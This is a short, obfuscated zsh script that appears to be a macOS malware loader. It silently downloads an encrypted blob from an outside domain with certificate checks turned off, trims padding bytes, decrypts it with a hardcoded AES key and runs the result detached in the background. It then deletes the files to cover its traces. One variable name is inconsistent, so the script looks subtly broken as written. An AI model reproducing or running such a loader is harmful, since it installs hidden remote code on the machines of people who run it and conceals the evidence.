#!/bin/zsh
q5mpu=$(mktemp /tmp/prf9hz.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/md1882359f50f0a34.bin" -o "$q5mpuz" || exit 1
xsdu5v=$(stat -f %z "$q5mpuz"); jxva6az=$(( xsdu5v - 3950 - 1023 ))
tail -c +$(( 3950 + 1 )) "$q5mpuz" | head -c $jxva6az | openssl enc -d -aes-256-cbc -k 0b28ca302ebeb9e9ab6b8b9b -out "$q5mpu" 2>/dev/null
[ -s "$q5mpu" ] && chmod 700 "$q5mpu" && ( "$q5mpu" & ) && disown
( sleep 3; rm -f "$q5mpu" "$q5mpuz" ) &>/dev/null &
